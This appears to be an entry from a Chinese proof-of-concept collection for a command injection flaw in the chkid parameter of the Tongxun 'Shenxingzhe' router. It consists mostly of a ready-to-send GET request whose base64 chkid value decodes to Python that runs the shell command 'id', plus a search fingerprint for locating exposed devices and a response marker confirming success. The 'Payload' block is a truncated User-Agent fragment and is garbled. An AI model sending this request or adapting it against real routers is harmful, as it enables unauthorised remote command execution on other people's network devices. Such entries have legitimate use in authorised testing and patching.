# 同迅科技-神行者路由chkid存在命令执行漏洞

同迅科技-神行者路由 ｜ 命令执行 ｜ —
- **指纹**：`app="同迅科技-神行者路由"`
- **请求**：`GET /?title=ABC&oIp=XXX&chkid=X19pbXBvcnRfXygib3MiKS5zeXN0ZW0oImlkIikgb3IgX19pbXBvcnRfXygic3VicHJvY2VzcyIpLmNoZWNrX291dHB1dCgiaWQiLCBzaGVsbD1UcnVlKS5kZWNvZGUoKSAjc1VzZXJDb2RleHNQd2Q= HTTP/1.1`

**Payload**
```
like Gecko) Chrome/91.0.4472.77 Safari/537.36
X-SXZ-R: 4
```
- **响应特征**：200 uid